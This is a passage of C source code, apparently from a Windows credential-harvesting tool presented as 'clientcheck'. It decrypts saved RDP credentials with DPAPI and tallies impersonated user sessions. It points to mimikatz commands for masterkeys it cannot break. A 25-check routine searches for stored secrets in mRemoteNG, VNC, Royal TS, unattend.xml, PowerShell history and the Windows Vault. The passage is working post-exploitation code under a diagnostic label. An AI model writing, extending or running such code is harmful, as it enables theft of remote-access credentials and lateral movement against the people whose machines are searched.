        "Credential files seen/dpapi_sig/decrypt_ok/parsed/termsrv/with_password: %d/%d/%d/%d/%d/%d\n"
        "Vault items/termsrv/with_password: %d/%d/%d\n"
        "Impersonated user contexts: %d\n"
        "DPAPI self-test (current context): %s\n"
        "Last CryptUnprotectData error: %d (13=ERROR_INVALID_DATA bad blob/length; 0x8009000B=wrong user key)\n"
        "Decrypt path: %s | helper attempts/ok: %d/%d | profile_load_ok: %d | elev_type: %d\n",
        cred_count, readable,
        g_rdp_stats.files_seen, g_rdp_stats.files_with_dpapi_sig, g_rdp_stats.files_decrypt_ok,
        g_rdp_stats.files_parsed, g_rdp_stats.files_termsrv, g_rdp_stats.files_with_password,
        g_rdp_stats.vault_items, g_rdp_stats.vault_termsrv, g_rdp_stats.vault_with_password,
        g_rdp_stats.impersonated_sessions,
        g_rdp_stats.dpapi_selftest_ok ? "OK" : "FAILED",
        g_rdp_stats.last_crypt_error,
        g_rdp_stats.decrypt_path_hint[0] ? g_rdp_stats.decrypt_path_hint : "(none)",
        g_rdp_stats.helper_attempts, g_rdp_stats.helper_ok,
        g_rdp_stats.profile_load_ok, g_rdp_stats.elev_type);
    if (g_rdp_stats.last_impersonated_sid[0]) {
        rp += rdp_buf_append(result, rp, sizeof(result),
            "Last impersonated SID: %s\n", g_rdp_stats.last_impersonated_sid);
    }
    if (g_rdp_stats.sample_path[0]) {
        rp += rdp_buf_append(result, rp, sizeof(result),
            "Sample credential file: %s\n"
            "Sample size/blob_off/blob_len: %d/%d/%d\n"
            "Sample masterkey GUID: %s\n"
            "Sample DPAPI flags: 0x%X\n",
            g_rdp_stats.sample_path,
            g_rdp_stats.sample_file_size, g_rdp_stats.sample_blob_off, g_rdp_stats.sample_blob_len,
            g_rdp_stats.sample_mk_guid[0] ? g_rdp_stats.sample_mk_guid : "(unknown)",
            (unsigned)g_rdp_stats.sample_dpapi_flags);
    }
    rp += rdp_buf_append(result, rp, sizeof(result), "\n");

    if (g_rdp_stats.failed_mk_count > 0) {
        int g;
        rp += rdp_buf_append(result, rp, sizeof(result),
            "Undecryptable masterkey GUIDs (mimikatz: sekurlsa::dpapi, then "
            "dpapi::cred /in:<file> /masterkey:<key>):\n");
        for (g = 0; g < g_rdp_stats.failed_mk_count; g++)
            rp += rdp_buf_append(result, rp, sizeof(result), "  {%s}\n",
                g_rdp_stats.failed_mk_guids[g]);
        rp += rdp_buf_append(result, rp, sizeof(result), "\n");
    }
    if (cred_count > 0)
        rp += rdp_buf_append(result, rp, sizeof(result), "Current session saved RDP credentials: %d\n\n", cred_count);

    append_logged_in_users(profiles, profile_count, creds, cred_count, result, &rp, sizeof(result));
    append_all_users(profiles, profile_count, creds, cred_count, result, &rp, sizeof(result));
    append_rdp_files_for_profiles(profiles, profile_count, result, &rp, sizeof(result));
    if (append_rdcman_settings_files(result, &rp, sizeof(result)))
        rp += rdp_buf_append(result, rp, sizeof(result), "\n");
    if (g_rdp_extended_enabled)
        rdp_append_extended_checklist(result, &rp, sizeof(result));
    return result;
}

/* ---------- extended RDP-ecosystem detection checklist (25 checks) ---------- */
static DWORD rdp_file_count(const char* pattern) {
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    DWORD n = 0;
    if (h == INVALID_HANDLE_VALUE) return 0;
    do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) n++; } while (FindNextFileA(h, &fd));
    FindClose(h);
    return n;
}

static int rdp_file_contains(const char* path, const char* needle) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    char buf[65536];
    DWORD got = 0;
    int found = 0;
    if (ReadFile(h, buf, sizeof(buf) - 1, &got, NULL)) {
        buf[got] = 0;
        found = (strstr(buf, needle) != NULL);
    }
    CloseHandle(h);
    return found;
}

static void rdp_append_extended_checklist(char* result, int* rp, int sz) {
    char path[MAX_PATH], path2[MAX_PATH];
    const char* up = getenv("USERPROFILE");
    const char* ad = getenv("APPDATA");
    const char* lad = getenv("LOCALAPPDATA");
    const char* pd = getenv("PROGRAMDATA");
    const char* wr = getenv("SystemRoot");
    if (!up || !ad || !lad || !pd || !wr) return;
    *rp += rdp_buf_append(result, *rp, (size_t)sz, "===== RDP extended detection (25 checks) =====\n");
    #define RDPCHK_FOUND(n) *rp += rdp_buf_append(result, *rp, (size_t)sz, "[FOUND %lu] ", (unsigned long)(n))
    #define RDPCHK_MISS()   *rp += rdp_buf_append(result, *rp, (size_t)sz, "[  -   ] ")

    snprintf(path, sizeof(path), "%s\\Documents\\Default.rdp", up);
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Default.rdp: %s\n", path); }
    else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Default.rdp\n");
    snprintf(path, sizeof(path), "%s\\Documents\\*.rdp", up);
    { DWORD n = rdp_file_count(path); if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Documents *.rdp files\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Documents *.rdp\n"); }
    snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\Recent\\*rdp*", ad);
    { DWORD n = rdp_file_count(path); if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Recent *.rdp shortcuts\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Recent *.rdp\n"); }
    snprintf(path, sizeof(path), "%s\\Microsoft\\Terminal Server Client\\Default", lad);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "TSC\\Default (MRU list)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "TSC\\Default\n");
    snprintf(path, sizeof(path), "%s\\Microsoft\\Terminal Server Client\\Cache\\*.bin", lad);
    { DWORD n = rdp_file_count(path); if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "TSC bitmap cache (forensic: screen fragments)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "TSC Cache\n"); }
    snprintf(path, sizeof(path), "%s\\mRemoteNG\\confCons.xml", lad);
    snprintf(path2, sizeof(path2), "%s\\mRemoteNG\\confCons.xml", ad);
    { int f = 0; if (rdp_file_count(path)) f = 1; if (GetFileAttributesA(path2) != INVALID_FILE_ATTRIBUTES) f = 1;
      if (f) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "mRemoteNG confCons.xml (AES; offline decryptable)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "mRemoteNG\n"); }
    snprintf(path, sizeof(path), "%s\\Remmina", ad);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Remmina profile dir\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Remmina\n");
    snprintf(path, sizeof(path), "%s\\Devolutions\\RemoteDesktopManager", lad);
    snprintf(path2, sizeof(path2), "%s\\Devolutions\\RemoteDesktopManager", pd);
    { int f = 0; if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) f = 1; if (GetFileAttributesA(path2) & FILE_ATTRIBUTE_DIRECTORY) f = 1;
      if (f) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Devolutions RemoteDesktopManager data\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Devolutions RDM\n"); }
    snprintf(path, sizeof(path), "%s\\code4ward", ad);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Royal TS (code4ward)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Royal TS\n");
    snprintf(path, sizeof(path), "%s\\Terminals\\connections.xml", ad);
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Terminals connections.xml\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Terminals\n");
    snprintf(path, sizeof(path), "%s\\Documents\\*.vnc", up);
    { DWORD n = rdp_file_count(path); if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Documents *.vnc (DES fixed key)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Documents *.vnc\n"); }
    snprintf(path, sizeof(path), "%s\\UltraVNC\\ultravnc.ini", pd);
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "UltraVNC ultravnc.ini (passwd= DES)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "UltraVNC\n");
    snprintf(path, sizeof(path), "%s\\TigerVNC", pd);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "TigerVNC config dir\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "TigerVNC\n");
    snprintf(path, sizeof(path), "%s\\RealVNC", pd);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "RealVNC config dir\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "RealVNC\n");
    snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", ad);
    { int r = rdp_file_contains(path, "cmdkey"); if (r == 1) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "PSReadLine history contains cmdkey entries\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "PSReadLine cmdkey\n"); }
    snprintf(path, sizeof(path), "%s\\Panther\\unattend.xml", wr);
    { int r = rdp_file_contains(path, "<Password>"); if (r == 1) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "unattend.xml contains <Password> (often base64 admin)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Panther unattend.xml\n"); }
    snprintf(path, sizeof(path), "%s\\System32\\sysprep\\unattend.xml", wr);
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "sysprep unattend.xml\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "sysprep unattend\n");
    snprintf(path, sizeof(path), "%s\\Prefetch\\RDP*", wr);
    { DWORD n = rdp_file_count(path); if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Prefetch RDP* artifacts\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Prefetch RDP*\n"); }
    { HKEY hk; if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD n = 0; RegQueryInfoKeyA(hk, NULL, NULL, NULL, &n, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "HKCU TSC\\Servers keys (UsernameHint per server)\n"); RegCloseKey(hk);
      } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "HKCU TSC\\Servers\n"); }
    { HKEY hk; if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Terminal Server Client\\Default", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD n = 0; RegQueryInfoKeyA(hk, NULL, NULL, NULL, NULL, NULL, NULL, &n, NULL, NULL, NULL, NULL);
        RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "HKCU TSC\\Default MRU values\n"); RegCloseKey(hk);
      } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "HKCU TSC\\Default\n"); }
    snprintf(path, sizeof(path), "%s\\Microsoft\\Credentials", ad);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { snprintf(path2, sizeof(path2), "%s\\*", path); DWORD n = rdp_file_count(path2);
      if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Roaming Credentials files (DPAPI)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Roaming Credentials (empty)\n"); }
    else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Roaming Credentials\n");
    snprintf(path, sizeof(path), "%s\\Microsoft\\Vault", lad);
    if (GetFileAttributesA(path) & FILE_ATTRIBUTE_DIRECTORY) { RDPCHK_FOUND(1); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Local Vault dir\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Vault\n");
    snprintf(path, sizeof(path), "%s\\Documents\\*.rdg", up);
    { DWORD n = rdp_file_count(path); if (n) { RDPCHK_FOUND(n); *rp += rdp_buf_append(result, *rp, (size_t)sz, "Documents *.rdg (RDCMan, DPAPI per-user)\n"); } else RDPCHK_MISS(), *rp += rdp_buf_append(result, *rp, (size_t)sz, "Documents *.rdg\n"); }
    *rp += rdp_buf_append(result, *rp, (size_t)sz, "\n");
}

/* Internal helper process entry: decrypt one DPAPI blob file under the current user context.
 * Invoked as: clientcheck --rdp-dpapi-unprotect <in_blob> <out_plain>
 * Returns process-style codes via rdp_try_internal_helper: -1 = not helper mode.
 */
int rdp_try_internal_helper(int argc, char** argv) {
    const char* in_path;
    const char* out_path;
    uint8_t* data = NULL;
    int len = 0;
    uint8_t* dec = NULL;
    int dec_len = 0;
    HANDLE h;
    DWORD written = 0;
    int exact;

    if (!argv || argc < 2) return -1;
    if (strcmp(argv[1], "--rdp-dpapi-unprotect") != 0) return -1;
    if (argc < 4 || !argv[2] || !argv[3]) return 2;

    in_path = argv[2];
    out_path = argv[3];

    data = read_file_shared(in_path, &len);
    if (!data) data = read_file(in_path, &len);
    if (!data || len < 16) {
        free(data);
        return 13;
    }

    /* Input is expected to already be a DPAPI blob (parent extracts offset). */
    exact = dpapi_blob_total_size(data, len);
    if (exact > 0 && exact <= len) {
        dec = crypt_unprotect_try(data, exact, &dec_len);
        if (!dec) dec = crypt_unprotect_try(data, len, &dec_len);
    } else {
        int sig = find_dpapi_blob_offset(data, len);
        if (sig >= 0) {
            exact = dpapi_blob_total_size(data + sig, len - sig);
            if (exact > 0)
                dec = crypt_unprotect_try(data + sig, exact, &dec_len);
            if (!dec)
                dec = crypt_unprotect_try(data + sig, len - sig, &dec_len);
        }
        if (!dec)
            dec = crypt_unprotect_try(data, len, &dec_len);
    }

    free(data);
    if (!dec || dec_len <= 0) {
        free(dec);
        {
            DWORD e = GetLastError();
            if (e == 0) e = 13;
            return (int)(e & 0x7fffffff);
        }
    }

    h = CreateFileA(out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        free(dec);
        return 5;
    }
    if (!WriteFile(h, dec, (DWORD)dec_len, &written, NULL) || (int)written != dec_len) {
        CloseHandle(h);
        free(dec);
        DeleteFileA(out_path);
        return 5;
    }
    CloseHandle(h);
    free(dec);
    return 0;
}
